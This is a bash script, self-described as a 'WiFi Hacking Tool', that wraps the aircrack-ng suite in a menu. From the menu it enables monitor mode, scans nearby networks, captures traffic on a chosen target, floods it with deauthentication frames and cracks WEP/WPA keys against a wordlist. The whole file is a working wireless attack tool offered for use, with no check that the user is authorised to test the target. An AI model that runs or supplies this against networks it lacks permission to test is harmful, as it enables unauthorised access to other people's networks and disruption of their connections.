#!/bin/bash

# Function to display the title in fancy style
display_title() {
    echo -e "\e[1;36m" # Set text color to cyan
    figlet -f slant "MR MIME'S WIFI"
    echo -e "\e[0m" # Reset text color
}

echo "Welcome to WiFi Hacking Tool"
echo "----------------------------"

# Function to enable monitor mode
enable_monitor_mode() {
    echo "Enabling monitor mode..."
    sudo airmon-ng start wlan0
}

# Function to scan for networks and list them
scan_networks() {
    echo "Scanning for networks..."
    sudo airodump-ng wlan0mon --output-format csv --write capture.csv &
    pid=$!
    sleep 30
    sudo kill $pid
    echo "Scan completed. Press Enter to continue..."
    read
    clear
    echo "Captured networks:"
    awk -F',' 'NR>1 {print NR-1 ". BSSID:", $1, "Channel:", $4, "ESSID:", $14}' capture.csv-01.csv
}

# Function to prompt for selection of network and set variables
select_network() {
    echo "Enter the number of the network to target:"
    read choice
    selected_bssid=$(awk -F',' -v n=$choice 'NR == n+1 {print $1}' capture.csv-01.csv)
    selected_channel=$(awk -F',' -v n=$choice 'NR == n+1 {print $4}' capture.csv-01.csv)
    selected_essid=$(awk -F',' -v n=$choice 'NR == n+1 {print $14}' capture.csv-01.csv)
    echo "Selected network - BSSID: $selected_bssid, Channel: $selected_channel, ESSID: $selected_essid"
}

# Function to capture packets on the target network
capture_packets() {
    select_network
    echo "Capturing packets on network $selected_essid ($selected_bssid)..."
    gnome-terminal -- bash -c "sudo airodump-ng --bssid $selected_bssid -c $selected_channel -w capture wlan0mon; exec bash"
}

# Function to perform packet injection
perform_injection() {
    select_network
    echo "Performing packet injection on network $selected_essid ($selected_bssid)..."
    sudo aireplay-ng --deauth 100 -a $selected_bssid wlan0mon
}

# Function to crack WEP/WPA keys
crack_keys() {
    select_network
    echo "Enter path to the capture file (e.g., /path/to/capture.cap):"
    read capture_file
    echo "Enter the type of encryption (WEP/WPA):"
    read encryption_type

    if [ $encryption_type == "WEP" ]; then
        echo "Starting WEP key cracking on network $selected_essid ($selected_bssid)..."
        sudo aircrack-ng -b $selected_bssid $capture_file
    elif [ $encryption_type == "WPA" ]; then
        echo "Enter wordlist path (e.g., /path/to/wordlist.txt):"
        read wordlist
        echo "Starting WPA key cracking on network $selected_essid ($selected_bssid)..."
        sudo aircrack-ng -w $wordlist -b $selected_bssid $capture_file
    else
        echo "Invalid encryption type entered!"
    fi
}

# Main menu
while :
do
    clear # Clear the screen for better readability
    display_title # Display the title
    echo ""
    echo "Main Menu"
    echo "1. Enable monitor mode"
    echo "2. Scan for networks"
    echo "3. Capture packets on the target network"
    echo "4. Perform packet injection"
    echo "5. Crack WEP/WPA keys"
    echo "6. Exit"
    echo "Enter your choice:"
    read choice

    case $choice in
        1) enable_monitor_mode ;;
        2) scan_networks ;;
        3) capture_packets ;;
        4) perform_injection ;;
        5) crack_keys ;;
        6) echo "Exiting..."; exit ;;
        *) echo "Invalid option";;
    esac
    read -p "Press Enter to continue..."
done
